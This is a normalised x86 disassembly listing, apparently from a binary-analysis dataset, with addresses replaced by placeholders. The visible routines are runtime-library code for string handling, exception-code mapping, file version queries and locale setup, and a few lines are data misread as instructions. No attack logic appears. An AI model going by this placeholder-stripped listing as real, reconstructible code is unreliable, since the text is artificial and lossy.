jb r-xdata
mov edx r-xdata
lea eax [ esi + ebx - 0x1 ]
mov ecx 0x2
call sub_408510
test eax eax
jne r-xdata
mov edx ebx
mov eax esi
call sub_40bf18
mov [ ebp - 0x4 ] eax
lea eax [ ebp - 0x10 ]
push eax
mov ecx [ ebp - 0x4 ]
mov edx ebx
mov eax esi
call sub_4043d4
mov edx [ ebp - 0x10 ]
mov eax edi
call sub_40417c
add ebx [ ebp - 0x4 ]
jmp r-xdata
mov eax edi
mov edx esi
call sub_403f08
jmp r-xdata
jmp r-xdata
xor eax eax
jmp r-xdata
mov edx r-xdata
lea eax [ esi + ebx - 0x1 ]
mov ecx 0x4
call sub_408510
test eax eax
jne r-xdata
mov eax edi
mov edx r-xdata
call sub_40417c
inc ebx
jmp r-xdata
mov eax esi
call sub_404174
cmp ebx eax
jle r-xdata
test al al
je r-xdata
mov edx r-xdata
lea eax [ esi + ebx - 0x1 ]
mov ecx 0x2
call sub_408510
test eax eax
jne r-xdata
mov eax edi
mov edx r-xdata
call sub_40417c
add ebx 0x3
jmp r-xdata
inc ebx
mov al [ esi + ebx - 0x1 ]
sub al 0x47
je r-xdata
jmp r-xdata
mov al [ esi + ebx - 0x1 ]
sub al 0x59
je r-xdata
mov eax edi
mov edx r-xdata
call sub_40417c
inc ebx
jmp r-xdata
inc ebx
sub al 0x20
je r-xdata
mov eax edi
mov edx r-xdata
call sub_40417c
jmp r-xdata
sub al 0x20
jne r-xdata
lea eax [ ebp - 0xc ]
mov dl [ esi + ebx - 0x1 ]
call sub_40409c
mov edx [ ebp - 0xc ]
mov eax edi
call sub_40417c
lea eax [ ebp - 0x14 ]
mov dl [ esi + ebx - 0x1 ]
call sub_40409c
mov edx [ ebp - 0x14 ]
mov eax edi
call sub_40417c
sub_40b0dc
push ebp
mov ebp esp
add esp 0xfffffba8
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov ebx edx
mov esi eax
push 0x1c
lea eax [ ebp - 0x330 ]
push eax
push ebx
call VirtualQuery
cmp [ ebp - 0x320 ] 0x1000
jne r-xdata
push 0x105
lea eax [ ebp - 0x212 ]
push eax
mov eax [ rw-data ]
push eax
call GetModuleFileNameA
mov eax ebx
call sub_40b0d0
mov [ ebp - 0x8 ] eax
jmp r-xdata
push 0x105
lea eax [ ebp - 0x212 ]
push eax
mov eax [ ebp - 0x32c ]
push eax
call GetModuleFileNameA
test eax eax
jne r-xdata
lea eax [ ebp - 0x212 ]
mov dl 0x5c
call sub_40c0dc
mov edx eax
inc edx
lea eax [ ebp - 0x10d ]
mov ecx 0x104
call sub_408434
mov ebx r-xdata
mov edi r-xdata
mov eax esi
mov edx [ r-xdata ]
call sub_403284
test al al
je r-xdata
sub ebx [ ebp - 0x32c ]
mov [ ebp - 0x8 ] ebx
push 0x100
lea eax [ ebp - 0x312 ]
push eax
mov eax [ rw-data ]
mov eax [ eax + 0x4 ]
push eax
mov eax [ rw-data ]
call sub_404f20
push eax
call LoadStringA
lea edx [ ebp - 0x458 ]
mov eax [ esi ]
call sub_403048
lea eax [ ebp - 0x458 ]
mov [ ebp - 0x358 ] eax
mov [ ebp - 0x354 ] 0x4
lea eax [ ebp - 0x10d ]
mov [ ebp - 0x350 ] eax
mov [ ebp - 0x34c ] 0x6
mov eax [ ebp - 0x8 ]
mov [ ebp - 0x348 ] eax
mov [ ebp - 0x344 ] 0x5
mov [ ebp - 0x340 ] ebx
mov [ ebp - 0x33c ] 0x6
mov [ ebp - 0x338 ] edi
mov [ ebp - 0x334 ] 0x6
lea eax [ ebp - 0x358 ]
push eax
push 0x4
lea ecx [ ebp - 0x312 ]
mov edx [ ebp + 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_408a6c
mov eax [ ebp - 0x4 ]
call sub_4083d0
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
mov eax [ esi + 0x4 ]
call sub_404374
mov ebx eax
mov eax ebx
call sub_4083d0
test eax eax
je r-xdata
cmp [ ebx + eax - 0x1 ] 0x2e
je r-xdata
mov edi r-xdata
sub_40b264
add esp 0xfffffbbc
push 0x400
lea ecx [ esp + 0x48 ]
call sub_40b0dc
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
push 0x40
lea eax [ esp + 0x8 ]
push eax
mov eax [ rw-data ]
mov eax [ eax + 0x4 ]
push eax
mov eax [ rw-data ]
call sub_404f20
push eax
call LoadStringA
push 0x2010
lea eax [ esp + 0x8 ]
push eax
lea eax [ esp + 0x4c ]
push eax
push 0x0
call MessageBoxA
mov eax [ rw-data ]
call sub_402990
call sub_402834
lea eax [ esp + 0x44 ]
push eax
lea eax [ esp + 0x48 ]
push eax
call CharToOemA
push 0x0
lea eax [ esp + 0x4 ]
push eax
lea eax [ esp + 0x4c ]
call sub_4083d0
push eax
lea eax [ esp + 0x50 ]
push eax
push 0xfffffff4
call GetStdHandle
push eax
call WriteFile
push 0x0
lea eax [ esp + 0x4 ]
push eax
push 0x2
push r-xdata
push 0xfffffff4
call GetStdHandle
push eax
call WriteFile
jmp r-xdata
add esp 0x444
retn
sub_40b32c
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
lea eax [ edi + 0x4 ]
mov edx esi
call sub_403f08
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403404
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_40345c
pop [ fs : 0x0 ]
add esp 0xc
sub_40b368
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
xor eax eax
push ebp
push sub_40b3c2
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
push eax
mov edx [ ebp + 0xc ]
mov ecx [ ebp + 0x8 ]
mov eax esi
call sub_408aac
mov edx [ ebp - 0x4 ]
lea eax [ edi + 0x4 ]
call sub_403f08
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40b3c9
lea eax [ ebp - 0x4 ]
call sub_403eb4
retn
add esp 0xfffffff0
call sub_403404
sub_40b3c9
mov eax edi
test bl bl
je r-xdata
mov eax edi
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x8
call sub_40345c
pop [ fs : 0x0 ]
add esp 0xc
sub_40b3e8
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
lea edx [ edi + 0x4 ]
mov eax esi
call sub_4059b4
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403404
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_40345c
pop [ fs : 0x0 ]
add esp 0xc
sub_40b424
push ebp
mov ebp esp
push 0x0
push 0x0
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
xor eax eax
push ebp
push sub_40b490
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
push eax
lea edx [ ebp - 0x8 ]
mov eax esi
call sub_4059b4
mov eax [ ebp - 0x8 ]
mov edx [ ebp + 0xc ]
mov ecx [ ebp + 0x8 ]
call sub_408aac
mov edx [ ebp - 0x4 ]
lea eax [ edi + 0x4 ]
call sub_403f08
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40b497
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_403ed8
retn
add esp 0xfffffff0
call sub_403404
sub_40b497
mov eax edi
test bl bl
je r-xdata
mov eax edi
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x8
call sub_40345c
pop [ fs : 0x0 ]
add esp 0xc
sub_40b4e4
push ebx
push esi
add esp 0xfffffff8
xor ebx ebx
call sub_4028a8
mov esi eax
jmp r-xdata
cmp ebx 0x6
jg r-xdata
cmp ebx 0x6
jg r-xdata
cmp esi [ ebx * 8 + rw-data ]
jne r-xdata
mov [ esp ] esi
mov [ esp + 0x4 ] 0x0
push esp
push 0x0
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b424
mov ecx [ ebx * 8 + rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b32c
jmp r-xdata
inc ebx
mov [ eax + 0xc ] esi
pop ecx
pop edx
pop esi
pop ebx
retn
sub_40b544
dec eax
mov ch 0x40
add [ esi ] cl
or dl [ ebp + eax * 2 + 0x78 ]
arpl [ ebp + 0x70 ] sp
je r-xdata
pop es
arpl [ gs : eax ] cx
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ eax + edx + 0x40040 ] dl
add [ eax ] al
push ebx
mov ebx edx
mov edx eax
dec dl
je r-xdata
mov edx [ rw-data ]
jmp r-xdata
dec dl
je r-xdata
push ebx
mov eax edx
jmp sub_40386c
mov edx [ rw-data ]
jmp r-xdata
dec edx
sub dl 0x16
jb r-xdata
and eax 0xff
lea eax [ eax * 8 + rw-data ]
mov ecx [ eax + 0x4 ]
mov eax [ eax ]
mov dl 0x1
call sub_40b32c
mov edx eax
jmp r-xdata
jmp r-xdata
call sub_40b4e4
mov edx eax
sub_40b5b8
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x20 ] ebx
mov [ ebp - 0x4 ] ebx
mov edi ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_40b654
push [ fs : eax ]
mov [ fs : eax ] esp
test ebx ebx
je r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_4059b4
lea eax [ ebp - 0x4 ]
mov edx ebx
call sub_403f4c
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x18 ] 0xb
mov [ ebp - 0x14 ] esi
mov [ ebp - 0x10 ] 0xb
mov [ ebp - 0xc ] edi
mov [ ebp - 0x8 ] 0x0
lea eax [ ebp - 0x1c ]
push eax
push 0x2
lea edx [ ebp - 0x20 ]
mov eax [ rw-data ]
call sub_4059b4
mov ecx [ ebp - 0x20 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b368
mov ebx eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40b65b
lea eax [ ebp - 0x20 ]
call sub_403eb4
lea eax [ ebp - 0x4 ]
call sub_403eb4
retn
sub_40b6a8
mov eax [ eax ]
cmp eax 0xc0000092
jg r-xdata
cmp eax 0xc0000096
jg r-xdata
je r-xdata
sub eax 0xc00000fd
je r-xdata
je r-xdata
mov al 0x6
retn
cmp eax 0xc000008e
jg r-xdata
mov al 0xe
retn
sub eax 0x3d
je r-xdata
mov al 0xc
retn
sub eax 0xc0000093
je r-xdata
add eax 0x3fffff71
sub eax 0x2
jb r-xdata
je r-xdata
mov al 0xd
retn
jmp r-xdata
mov al 0x9
retn
dec eax
je r-xdata
je r-xdata
mov al 0x7
retn
sub eax 0xc0000005
je r-xdata
mov al 0x16
retn
mov al 0x3
retn
dec eax
je r-xdata
mov al 0x8
retn
jmp r-xdata
mov al 0xb
retn
sub eax 0x87
je r-xdata
mov al 0x5
retn
jmp r-xdata
mov al 0x4
retn
dec eax
je r-xdata
jmp r-xdata
sub_40b740
push ebp
mov ebp esp
add esp 0xfffffe90
push ebx
push esi
xor eax eax
mov [ ebp - 0x170 ] eax
mov [ ebp - 0x14c ] eax
mov [ ebp - 0x154 ] eax
mov [ ebp - 0x150 ] eax
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_40b8fb
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
mov ebx [ eax - 0x4 ]
cmp [ ebx + 0x14 ] 0x0
jne r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_4059b4
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_4059b4
jmp r-xdata
mov eax [ ebx + 0xc ]
mov [ ebp - 0x16c ] eax
mov [ ebp - 0x168 ] 0x5
mov eax [ ebp - 0x4 ]
mov [ ebp - 0x164 ] eax
mov [ ebp - 0x160 ] 0xb
mov [ ebp - 0x15c ] esi
mov [ ebp - 0x158 ] 0x5
lea eax [ ebp - 0x16c ]
push eax
push 0x2
lea edx [ ebp - 0x170 ]
mov eax [ rw-data ]
call sub_4059b4
mov ecx [ ebp - 0x170 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b368
mov ebx eax
push 0x105
lea eax [ ebp - 0x125 ]
push eax
mov eax [ ebp - 0x1c ]
push eax
call GetModuleFileNameA
test eax eax
je r-xdata
mov esi [ ebx + 0x18 ]
push 0x1c
lea eax [ ebp - 0x20 ]
push eax
mov eax [ ebx + 0xc ]
push eax
call VirtualQuery
cmp [ ebp - 0x10 ] 0x1000
jne r-xdata
mov eax [ ebx + 0xc ]
mov [ ebp - 0x148 ] eax
mov [ ebp - 0x144 ] 0x5
lea eax [ ebp - 0x150 ]
lea edx [ ebp - 0x125 ]
mov ecx 0x105
call sub_404124
mov eax [ ebp - 0x150 ]
lea edx [ ebp - 0x14c ]
call sub_4082e8
mov eax [ ebp - 0x14c ]
mov [ ebp - 0x140 ] eax
mov [ ebp - 0x13c ] 0xb
mov eax [ ebp - 0x4 ]
mov [ ebp - 0x138 ] eax
mov [ ebp - 0x134 ] 0xb
mov [ ebp - 0x130 ] esi
mov [ ebp - 0x12c ] 0x5
lea eax [ ebp - 0x148 ]
push eax
push 0x3
lea edx [ ebp - 0x154 ]
mov eax [ rw-data ]
call sub_4059b4
mov ecx [ ebp - 0x154 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b368
mov ebx eax
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40b902
lea eax [ ebp - 0x170 ]
call sub_403eb4
lea eax [ ebp - 0x154 ]
mov edx 0x3
call sub_403ed8
lea eax [ ebp - 0x4 ]
call sub_403eb4
retn
sub_40b90c
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
xor edx edx
mov [ ebp - 0x10 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_40b9c7
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_40b6a8
and eax 0xff
mov edx eax
add edx 0xfffffffd
sub edx 0x8
jb r-xdata
lea eax [ eax * 8 + rw-data ]
mov ecx [ eax + 0x4 ]
mov eax [ eax ]
mov dl 0x1
call sub_40b32c
mov ebx eax
jmp r-xdata
je r-xdata
mov eax ebx
mov edx [ r-xdata ]
call sub_403284
test al al
je r-xdata
push ebp
call sub_40b740
pop ecx
mov ebx eax
jmp r-xdata
dec edx
sub edx 0xa
jae r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40b9ce
lea eax [ ebp - 0x10 ]
call sub_403eb4
retn
mov eax [ ebp - 0x4 ]
mov [ ebx + 0xc ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax ]
mov [ ebp - 0xc ] eax
mov [ ebp - 0x8 ] 0x0
lea eax [ ebp - 0xc ]
push eax
push 0x0
lea edx [ ebp - 0x10 ]
mov eax [ rw-data ]
call sub_4059b4
mov ecx [ ebp - 0x10 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b368
mov ebx eax
sub_40b9e8
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b3e8
mov [ rw-data ] eax
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b3e8
mov [ rw-data ] eax
mov eax [ rw-data ]
mov [ eax ] r-xdata
mov eax [ rw-data ]
mov [ eax ] sub_40b9d8
mov eax [ rw-data ]
mov edx [ r-xdata ]
mov [ eax ] edx
mov eax [ rw-data ]
mov [ eax ] sub_40b728
mov eax [ rw-data ]
mov [ eax ] sub_40b90c
mov eax sub_40b674
mov edx [ rw-data ]
mov [ edx ] eax
mov eax sub_40b690
mov edx [ rw-data ]
mov [ edx ] eax
retn
sub_40ba6c
cmp [ rw-data ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ rw-data ]
mov [ eax + 0xc ] 0x1
mov eax [ rw-data ]
mov edx [ eax ]
call [ edx - 0x8 ]
xor eax eax
mov [ rw-data ] eax
mov eax [ rw-data ]
xor edx edx
mov [ eax ] edx
mov eax [ rw-data ]
xor edx edx
mov [ eax ] edx
mov eax [ rw-data ]
xor edx edx
mov [ eax ] edx
mov eax [ rw-data ]
xor edx edx
mov [ eax ] edx
mov eax [ rw-data ]
xor edx edx
mov [ eax ] edx
mov eax [ rw-data ]
xor edx edx
mov [ eax ] edx
retn
mov eax [ rw-data ]
mov [ eax + 0xc ] 0x1
mov eax [ rw-data ]
call sub_4030f8
xor eax eax
mov [ rw-data ] eax
sub_40baec
add esp 0xffffff6c
mov [ esp ] 0x94
push esp
call GetVersionExA
test eax eax
je r-xdata
add esp 0x94
retn
mov eax [ esp + 0x10 ]
mov [ rw-data ] eax
mov eax [ esp + 0x4 ]
mov [ rw-data ] eax
mov eax [ esp + 0x8 ]
mov [ rw-data ] eax
cmp [ rw-data ] 0x1
jne r-xdata
mov eax [ esp + 0xc ]
mov [ rw-data ] eax
mov eax [ esp + 0xc ]
and eax 0xffff
mov [ rw-data ] eax
jmp r-xdata
mov eax rw-data
lea edx [ esp + 0x14 ]
mov ecx 0x80
call sub_404124
sub_40bb7c
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
xor edx edx
mov [ ebp - 0x8 ] edx
mov ebx eax
xor eax eax
push ebp
push sub_40bc52
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0x4 ] 0xffffffff
lea eax [ ebp - 0x8 ]
mov edx ebx
call sub_403f4c
lea eax [ ebp - 0x8 ]
call j_sub_404380#2
lea eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0x8 ]
call sub_404374
push eax
call GetFileVersionInfoSizeA
mov ebx eax
test ebx ebx
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40bc59
lea eax [ ebp - 0x8 ]
call sub_403eb4
retn
mov eax ebx
call sub_4026cc
mov [ ebp - 0x10 ] eax
xor eax eax
push ebp
push sub_40bc35
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x10 ]
push eax
push ebx
mov eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0x8 ]
call sub_404374
push eax
call GetFileVersionInfoA
test eax eax
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x10 ]
call sub_4026ec
retn
lea eax [ ebp - 0x18 ]
push eax
lea eax [ ebp - 0x14 ]
push eax
push r-xdata
mov eax [ ebp - 0x10 ]
push eax
call VerQueryValueA
test eax eax
je r-xdata
mov eax [ ebp - 0x14 ]
mov eax [ eax + 0x8 ]
mov [ ebp - 0x4 ] eax
sub_40bc68
push esi
push edi
mov edi edx
xor edx edx
test eax eax
je r-xdata
mov eax edx
pop edi
pop esi
retn
cmp [ eax + edi ] 0x0
je r-xdata
test edi edi
jne r-xdata
mov esi edi
dec esi
jmp r-xdata
mov al [ eax ]
and eax 0xff
bt [ rw-data ] eax
jae r-xdata
test esi esi
jl r-xdata
mov dl 0x1
jmp r-xdata
mov ecx edi
sub ecx esi
and ecx 0x80000001
jns r-xdata
mov cl [ eax + esi ]
and ecx 0xff
bt [ rw-data ] ecx
jb r-xdata
test ecx ecx
jne r-xdata
dec ecx
or ecx 0xfffffffe
inc ecx
dec esi
mov al [ eax + edi ]
and eax 0xff
bt [ rw-data ] eax
jae r-xdata
mov dl 0x2
jmp r-xdata
mov dl 0x1
sub_40bce0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
cmp [ rw-data ] 0x0
je r-xdata
pop esi
pop ebx
retn
mov eax ebx
call sub_404374
mov edx esi
dec edx
call sub_40bc68
sub_40bd1c
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_404174
cmp esi eax
jle r-xdata
mov edx esi
mov eax ebx
call sub_40bd44
pop esi
pop ebx
retn
mov eax ebx
call sub_404174
mov esi eax
sub_40bd44
push ebx
push esi
push edi
mov esi edx
mov ebx eax
xor edi edi
test esi esi
jle r-xdata
mov eax edi
pop edi
pop esi
pop ebx
retn
mov eax ebx
call sub_404174
cmp esi eax
jg r-xdata
mov edi esi
cmp [ rw-data ] 0x0
je r-xdata
mov eax 0x1
xor edi edi
cmp esi eax
jl r-xdata
mov dl [ ebx + eax - 0x1 ]
and edx 0xff
bt [ rw-data ] edx
jae r-xdata
inc eax
mov edx eax
mov eax ebx
call sub_40bf54
jmp r-xdata
inc edi
cmp esi eax
jge r-xdata
sub_40bd9c
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov edi eax
mov eax edi
call sub_404174
mov [ ebp - 0xc ] eax
mov esi 0x1
mov ebx 0x1
jmp r-xdata
cmp ebx [ ebp - 0xc ]
jge r-xdata
cmp esi [ ebp - 0x4 ]
jne r-xdata
cmp esi [ ebp - 0x4 ]
jl r-xdata
mov eax [ ebp - 0x8 ]
mov [ eax ] esi
mov eax [ ebp + 0x8 ]
mov [ eax ] ebx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
cmp ebx [ ebp - 0xc ]
jge r-xdata
inc esi
mov al [ edi + ebx - 0x1 ]
and eax 0xff
bt [ rw-data ] eax
jae r-xdata
mov al [ edi + ebx - 0x1 ]
and eax 0xff
bt [ rw-data ] eax
jae r-xdata
inc ebx
mov edx ebx
mov eax edi
call sub_40bf54
mov ebx eax
jmp r-xdata
mov edx ebx
mov eax edi
call sub_40bf54
dec eax
mov ebx eax
sub_40be2c
push ebx
push esi
add esp 0xfffffff8
mov ebx edx
mov esi eax
xor eax eax
mov [ esp ] eax
test ebx ebx
jle r-xdata
mov eax [ esp ]
pop ecx
pop edx
pop esi
pop ebx
retn
mov eax esi
call sub_404174
cmp ebx eax
jg r-xdata
cmp ebx 0x1
jle r-xdata
mov [ esp ] ebx
cmp [ rw-data ] 0x0
je r-xdata
push esp
lea ecx [ esp + 0x8 ]
mov edx ebx
dec edx
mov eax esi
call sub_40bd9c
dec ebx
cmp ebx [ esp + 0x4 ]
jg r-xdata
xor eax eax
mov [ esp ] eax
jmp r-xdata
mov eax esi
call sub_404174
cmp eax [ esp ]
jg r-xdata
inc [ esp ]
jmp r-xdata
sub_40be90
push ebx
push esi
add esp 0xfffffff8
mov ebx edx
mov esi eax
xor eax eax
mov [ esp ] eax
test ebx ebx
jle r-xdata
mov eax [ esp ]
pop ecx
pop edx
pop esi
pop ebx
retn
mov eax esi
call sub_404174
cmp ebx eax
jle r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov eax esi
call sub_404174
mov ebx eax
mov [ esp ] ebx
push esp
lea ecx [ esp + 0x8 ]
mov edx ebx
mov eax esi
call sub_40bd9c
mov eax esi
call sub_404174
cmp eax [ esp ]
jge r-xdata
mov eax esi
call sub_404174
mov [ esp ] eax
jmp r-xdata
sub_40bf18
push ebx
push esi
mov esi edx
mov ebx eax
mov eax 0x1
cmp [ rw-data ] 0x0
je r-xdata
pop esi
pop ebx
retn
mov dl [ ebx + esi - 0x1 ]
and edx 0xff
bt [ rw-data ] edx
jae r-xdata
mov eax ebx
call sub_404374
add eax esi
dec eax
call sub_40bef0
sub_40bf54
push ebx
push esi
mov ebx edx
mov esi eax
lea eax [ ebx + 0x1 ]
cmp [ rw-data ] 0x0
je r-xdata
pop esi
pop ebx
retn
mov dl [ esi + ebx - 0x1 ]
and edx 0xff
bt [ rw-data ] edx
jae r-xdata
mov eax esi
call sub_404374
add eax ebx
dec eax
call sub_40bef0
add eax ebx
sub_40bf90
push ebx
push esi
mov ebx edx
mov esi eax
test ebx ebx
jle r-xdata
xor eax eax
pop esi
pop ebx
retn
mov eax esi
call sub_404174
cmp ebx eax
jg r-xdata
cmp [ esi + ebx - 0x1 ] 0x5c
jne r-xdata
mov edx ebx
mov eax esi
call sub_40bce0
test al al
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
sub_40bfc4
push ebx
push esi
mov ebx edx
mov esi eax
mov eax ebx
mov edx esi
call sub_403f08
mov eax [ ebx ]
call sub_404174
mov edx eax
mov eax [ ebx ]
call sub_40bf90
test al al
jne r-xdata
pop esi
pop ebx
retn
mov eax ebx
mov edx r-xdata
call sub_40417c
sub_40c004
push ebx
push esi
push edi
push ebp
mov esi edx
mov ebx eax
xor edi edi
mov eax ebx
call sub_404374
push eax
mov eax esi
call sub_404374
mov ebp eax
mov eax ebp
pop edx
call sub_40c03c
mov ebx eax
test ebx ebx
je r-xdata
mov eax edi
pop ebp
pop edi
pop esi
pop ebx
retn
mov edi ebx
sub edi ebp
inc edi
sub_40c03c
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov ebp edx
mov esi eax
xor ebx ebx
test esi esi
je r-xdata
mov eax ebx
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
cmp [ esi ] 0x0
je r-xdata
test ebp ebp
je r-xdata
cmp [ ebp ] 0x0
je r-xdata
mov eax esi
call sub_4083d0
mov [ esp ] eax
mov eax ebp
call sub_4083d0
mov edi eax
mov edx ebp
mov eax esi
call sub_408568
mov ebx eax
jmp r-xdata
test ebx ebx
je r-xdata
xor ebx ebx
mov eax ebx
sub eax esi
mov edx [ esp ]
sub edx eax
cmp edi edx
jbe r-xdata
mov edx ebx
sub edx esi
mov eax esi
call sub_40bd04
mov [ esp + 0x4 ] al
cmp [ esp + 0x4 ] 0x2
je r-xdata
cmp [ esp + 0x4 ] 0x1
jne r-xdata
push edi
push ebp
push edi
push ebx
push 0x0
push 0x400
call CompareStringA
cmp eax 0x2
je r-xdata
inc ebx
mov edx ebp
mov eax ebx
call sub_408568
mov ebx eax
inc ebx
sub_40c0dc
push ebx
push esi
mov ebx edx
mov edx ebx
call sub_40c104
mov esi eax
test bl bl
je r-xdata
mov eax esi
pop esi
pop ebx
retn
test eax eax
je r-xdata
mov esi eax
inc eax
mov edx ebx
call sub_40c104
test eax eax
jne r-xdata
sub_40c104
push ebx
push esi
push edi
mov ebx edx
mov esi eax
mov edx ebx
mov eax esi
call sub_408554
mov edi eax
test edi edi
je r-xdata
mov eax edi
pop edi
pop esi
pop ebx
retn
mov edx edi
sub edx esi
mov eax esi
call sub_40bd04
sub al 0x1
jb r-xdata
je r-xdata
inc edi
jmp r-xdata
inc edi
mov edx ebx
mov eax edi
call sub_408554
mov edi eax
test edi edi
jne r-xdata
sub_40c144
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
xor edx edx
mov [ ebp - 0xc ] edx
xor edx edx
push ebp
push sub_40c1a8
push [ fs : edx ]
mov [ fs : edx ] esp
push 0x7
lea edx [ ebp - 0x7 ]
push edx
push 0x1004
push eax
call GetLocaleInfoA
lea eax [ ebp - 0xc ]
lea edx [ ebp - 0x7 ]
mov ecx 0x7
call sub_404124
mov eax [ ebp - 0xc ]
push eax
call GetACP
mov edx eax
pop eax
call sub_407f60
mov ebx eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40c1af
lea eax [ ebp - 0xc ]
call sub_403eb4
retn
sub_40c1b8
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov edi [ ebp + 0x8 ]
add edi 0xffffffec
push edi
mov eax [ rw-data ]
call sub_40c144
push eax
call GetCPInfo
xor esi esi
jmp r-xdata
cmp esi 0xc
jge r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
mov al [ edi + esi + 0x6 ]
or al [ edi + esi + 0x7 ]
jne r-xdata
mov al [ edi + esi + 0x6 ]
mov bl [ edi + esi + 0x7 ]
sub bl al
jb r-xdata
add esi 0x2
inc ebx
mov [ ebp - 0x1 ] al
mov al [ ebp - 0x1 ]
and eax 0xff
bts [ rw-data ] eax
inc [ ebp - 0x1 ]
dec bl
jne r-xdata
sub_40c230
push ebp
mov ebp esp
add esp 0xfffffe68
push ebx
push esi
push edi
mov [ rw-data ] 0x409
mov [ rw-data ] 0x9
mov [ rw-data ] 0x1
call GetThreadLocale
test eax eax
je r-xdata
test ax ax
je r-xdata
mov [ rw-data ] eax
mov esi r-xdata
mov edi rw-data
mov ecx 0x8
[ edi ] [ esi ]
cmp [ rw-data ] 0x2
jne r-xdata
mov edx eax
and dx 0x3ff
movzx edx dx
mov [ rw-data ] edx
movzx eax ax
shr eax 0xa
mov [ rw-data ] eax
push 0x4a
call GetSystemMetrics
test eax eax
setne al
mov [ rw-data ] al
push 0x2a
call GetSystemMetrics
test eax eax
setne bl
mov [ rw-data ] bl
test bl bl
je r-xdata
call sub_40c218
test al al
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
push ebp
call sub_40c1b8
pop ecx
push ebp
call sub_40c1b8
pop ecx
mov eax rw-data
mov edx r-xdata
mov cl 0x20
call sub_402c28
setne bl
mov [ rw-data ] bl
test bl bl
je r-xdata
mov [ rw-data ] 0x0
mov [ rw-data ] 0x0
jmp r-xdata
mov eax 0x80
lea edx [ ebp - 0x94 ]
mov [ rw-data ] 0x0
jmp r-xdata
mov [ edx ] al
inc eax
inc edx
cmp eax 0x100
jne r-xdata
lea eax [ ebp - 0x94 ]
lea edx [ ebp - 0x196 ]
push edx
push 0x80
push eax
push 0x2
mov eax [ rw-data ]
push eax
call GetStringTypeExA
mov eax 0x80
lea edx [ ebp - 0x196 ]
add edx 0x2
dec eax
jne r-xdata
cmp [ edx ] 0x2
sete cl
